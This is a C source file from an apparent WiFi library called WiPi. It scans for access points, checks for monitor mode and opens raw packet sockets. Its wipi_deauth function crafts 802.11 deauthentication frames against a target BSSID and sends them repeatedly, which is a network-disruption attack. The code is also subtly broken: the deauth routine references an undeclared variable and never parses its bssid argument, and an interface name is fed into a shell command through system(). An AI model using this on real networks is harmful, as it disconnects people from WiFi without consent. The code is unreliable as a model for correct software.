/*    wipi.c    */

/*
 * Author: ripmeep
 * GitHub: https://github.com/ripmeep/
 * Date  : 20/03/2023
 */

/* Library definitions for WiPi.
 * See wipi.h for source declarations.
 *
 * Requires:
 *   - libiw-dev
 *   - wireless-tools
 */

#ifndef _GNU_SOURCE
    #define _GNU_SOURCE
#endif

/*    INCLUDES    */
//  #include <stdio.h>
//  #include <stdlib.h>
//  #include <string.h>

#ifndef _WIPI_H_
    #include "wipi.h"
#endif

/*    EXTERNS    */
WIPI_STATUS WIPI_ERRNO = WIPI_ERR_OK;

/*    FUNCTION DEFINITIONS    */
__attribute__((__pure__))
__wur
struct __wipi_interface_t* wipi_get_interfaces(uint32_t sa_family)
{
    struct ifaddrs*             ifa, *ifp;
    struct __wipi_interface_t*  wiface, *wifh;

    wifh = (struct __wipi_interface_t*)malloc( sizeof(struct __wipi_interface_t) );
    assert(wifh != NULL);

    wiface = wifh;

    wiface->head = wifh;
    wiface->next = NULL;

    getifaddrs(&ifa);

    for (ifp = ifa; ifp; ifp = ifp->ifa_next)
    {
        if (ifp->ifa_addr->sa_family != sa_family)
            continue;
        
        wiface->if_name  = strdup(ifp->ifa_name);
        
        wiface->if_addr  = strdup( inet_ntoa(((struct sockaddr_in*)ifp->ifa_addr)->sin_addr) );
        wiface->if_mask  = strdup( ifp->ifa_netmask ? inet_ntoa(((struct sockaddr_in*)ifp->ifa_netmask)->sin_addr) : "");
        wiface->if_flags = ifp->ifa_flags; 
        wiface->if_mon   = wipi_interface_monitor_mode(wiface);

        wiface->next = (struct __wipi_interface_t*)malloc( sizeof(struct __wipi_interface_t) );
        assert(wiface->next != NULL);

        wiface = wiface->next;
        wiface->head = wifh;
        wiface->next = NULL;
    }

    freeifaddrs(ifa);

    return wifh;
}

__attribute__((__pure__))
__wur
struct __wipi_interface_t* wipi_interface_get(struct __wipi_interface_t* wi,
                                              const char* __restrict__ iface)
{
    if (wi == NULL || iface == NULL)
        return NULL;

    wi = wi->head;

    for (wi = wi; wi->next; wi = wi->next)
    {
        if (strstr(wi->if_name, iface))
            return wi;
    }

    return NULL;
}

__attribute__((__pure__))
__wur
struct __wipi_beacon_t* wipi_beacon_get(struct __wipi_beacon_t* wb,
                                        const char* __restrict__ bssid)
{
    if (wb == NULL || bssid == NULL)
        return NULL;

    wb = wb->head;

    for (wb = wb; wb->next; wb = wb->next)
    {
        if (strstr(wb->bssid, bssid))
            return wb;
    }

    return NULL;
}

__wur
struct __wipi_scanner_t* wipi_scanner_init(const char* __restrict__ iface)
{
    struct __wipi_scanner_t*    ws;

    ws = (struct __wipi_scanner_t*)malloc( sizeof(struct __wipi_scanner_t) );

    assert(ws != NULL);

    memset( ws, 0, sizeof(struct __wipi_scanner_t) );
   
    ws->sockets = iw_sockets_open();

    if (ws->sockets <= 0)
    {
        WIPI_ERRNO = WIPI_ERR_SOCKFD;
        
        return NULL;
    }

    if (iw_get_range_info(ws->sockets, iface, &ws->iwr) < 0)
    {
        WIPI_ERRNO = WIPI_ERR_RANGE;

        return NULL;
    }

    ws->iface = strdup(iface);

    return ws;
}

void wipi_populate_beacon(struct __wipi_beacon_t* wb,
                          struct __wipi_scanner_t* ws)
{
    char*   tok;
    double  dref;

    memset( wb, 0, sizeof(struct __wipi_beacon_t) );

    strncpy(wb->ssid, ws->res->b.essid, WIPI_MAX_SSID);

    if (ws->res->has_ap_addr)
        iw_sawap_ntop(&ws->res->ap_addr, wb->bssid);

    if (ws->res->b.has_freq)
    {
        iw_print_freq_value(wb->cfreq, WIPI_MAX_FREQ, ws->res->b.freq);

        tok = strtok(wb->cfreq, " ");

        if (tok)
        {
            wb->freq = strtod(tok, NULL);
            wb->freq = wb->freq;

            for (int i = 0; i < ws->iwr.num_frequency; i++)
            {
                dref = iw_freq2float(&(ws->iwr.freq[i]));
                dref /= 1000000000; /* Hz to GHz */

                if (wb->freq == dref)
                    wb->channel = ws->iwr.freq[i].i;
            }
        }
    }

    if (ws->res->has_stats)
    {
        iw_print_stats(wb->stats,
                       WIPI_MAX_STATS,
                       &ws->res->stats.qual,
                       &ws->iwr,
                       1);

        wb->db = ws->res->stats.qual.level;
        wb->qual = ((float)ws->res->stats.qual.qual / 70) * 100;
    }
}

__wur
struct __wipi_beacon_t* wipi_scanner_scan(struct __wipi_scanner_t* ws)
{
    struct __wipi_beacon_t* wb, *wbh;

    wb = (struct __wipi_beacon_t*)malloc( sizeof(struct __wipi_beacon_t) );

    assert(wb != NULL);

    if (iw_scan(ws->sockets,
                ws->iface,
                ws->iwr.we_version_compiled,
                &ws->wsh) < 0)
    {
        WIPI_ERRNO = WIPI_ERR_SCAN;

        return NULL;
    }

    // iw_sockets_close(ws->sockets);

    wbh = wb;
    ws->res = ws->wsh.result;

    do
    {
        wipi_populate_beacon(wb, ws);

        wb->next = NULL;

        if (ws->res->next != NULL)
        {
            wb->next = (struct __wipi_beacon_t*)malloc( sizeof(struct __wipi_beacon_t) );

            wb = wb->next;

            wb->head = wbh;
            wb->next = NULL;

            ws->res = ws->res->next;
        }
    } while (ws->res->next != NULL);

    return wbh;
}

uint8_t wipi_interface_monitor_mode(struct __wipi_interface_t* wi)
{
    char    cmd[256];

    if (wi == NULL)
        return 0;

    snprintf(cmd,
             sizeof(cmd),
             "iwconfig %s 2>&1 | grep Monitor > /dev/null",
             wi->if_name);

    return system(cmd) == 0;
}

int wipi_mon_socket(struct __wipi_interface_t* wi)
{
    struct ifreq        ifr;
    struct sockaddr_ll  ll;
    int                 sockfd;

    assert(wi != NULL);
    assert(sizeof(ifr.ifr_name) == IFNAMSIZ);

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (sockfd < 0)
    {
        WIPI_ERRNO = WIPI_ERR_SOCKFD;

        return -1;
    }

    memset( &ifr, 0, sizeof(ifr) );
    memcpy( ifr.ifr_name, wi->if_name, sizeof(ifr.ifr_name) );

    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0)
    {
        WIPI_ERRNO = WIPI_ERR_SOCKFD;

        return -1;
    }

    memset( &ll, 0, sizeof(ll) );

    ll.sll_family = AF_PACKET;
    ll.sll_ifindex = ifr.ifr_ifindex;
    ll.sll_protocol = htons(ETH_P_ALL);

    if (bind( sockfd, (struct sockaddr*)&ll, sizeof(ll) ) < 0)
    {
        WIPI_ERRNO = WIPI_ERR_SOCKFD;

        return -1;
    }

    return sockfd;
}

int wipi_deauth(struct __wipi_interface_t* wi,
                const char* __restrict__ bssid,
                int packets,
                int delay)
{
    int     sockfd, sent;
    uint8_t packet[38], b[6], tmp[3];

    assert(wi != NULL);
    assert(wb != NULL);

    if (!wi->if_mon)
    {
        WIPI_ERRNO = WIPI_ERR_NOMON;

        return -1;
    }

    packets = packets > 0 ? packets : 50;
    delay = delay > 0 ? delay : 100; 

    sockfd = wipi_mon_socket(wi);

    if (sockfd < 0)
    {
        WIPI_ERRNO = WIPI_ERR_SOCKFD;

        return -1;
    }

    for (int i = 0; i < 6; i++)
    {
        memset(tmp, 0, 3);
        memcpy(tmp, b + i * 2 + (i > 0 ? i : 0), 2);

        b[i] = strtoul((char*)tmp, NULL, 16);
    }

    packet[0]  = 0x00;
    packet[1]  = 0x00;
    packet[2]  = 0x0C;
    packet[3]  = 0x00;
    packet[4]  = 0x04;
    packet[5]  = 0x80;
    packet[6]  = 0x00;
    packet[7]  = 0x00;
    packet[8]  = 0x02;
    packet[9]  = 0x00;
    packet[10] = 0x18;
    packet[11] = 0x00;
    packet[12] = 0xC0;
    packet[13] = 0x00;
    packet[14] = 0x3A;
    packet[15] = 0x01;

    memset(packet + 16, 0xFF, 6);
    memcpy(packet + 22, b, 6);
    memcpy(packet + 28, b, 6);

    packet[34] = 0xF0;
    packet[35] = 0x3F;
    packet[36] = 0x07;
    packet[37] = 0x00;

    sent = 0;

    for (int i = 0; i < packets; i++)
    {
        sent += send(sockfd, packet, 38, 0) < 0 ? 0 : 1;

        usleep(delay * 1000);
    }

    return sent;
}

void wipi_scanner_free(struct __wipi_scanner_t* ws)
{
    memset( &ws->iwr, 0, sizeof(ws->iwr) );
    memset( &ws->wsh, 0, sizeof(ws->wsh) );

    iw_sockets_close(ws->sockets);

    ws->status = WIPI_ERR_OK;

    free(ws);
}
